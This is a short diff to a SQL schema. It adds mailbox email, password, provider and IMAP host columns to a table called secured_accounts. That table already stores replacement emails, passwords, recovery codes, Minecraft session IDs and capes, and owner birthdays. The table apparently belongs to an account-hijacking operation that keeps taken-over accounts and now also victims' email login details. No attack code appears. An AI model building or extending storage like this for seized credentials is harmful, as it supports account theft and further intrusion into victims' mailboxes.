@@ -543,6 +543,10 @@ CREATE TABLE IF NOT EXISTS public.secured_accounts (
   new_email TEXT,
   new_password TEXT,
   new_recovery_code TEXT,
+  mailbox_email TEXT,
+  mailbox_password TEXT,
+  mailbox_provider TEXT,
+  mailbox_imap_host TEXT,
   mc_ssid TEXT,
   mc_capes TEXT,
   mc_method TEXT,
@@ -552,6 +556,11 @@ CREATE TABLE IF NOT EXISTS public.secured_accounts (
   owner_birthday TEXT,
   secured_at TIMESTAMPTZ NOT NULL DEFAULT now()
 );
+ALTER TABLE public.secured_accounts
+  ADD COLUMN IF NOT EXISTS mailbox_email TEXT,
+  ADD COLUMN IF NOT EXISTS mailbox_password TEXT,
+  ADD COLUMN IF NOT EXISTS mailbox_provider TEXT,
+  ADD COLUMN IF NOT EXISTS mailbox_imap_host TEXT;
 
 GRANT ALL ON public.secured_accounts TO service_role;
 ALTER TABLE public.secured_accounts ENABLE ROW LEVEL SECURITY;
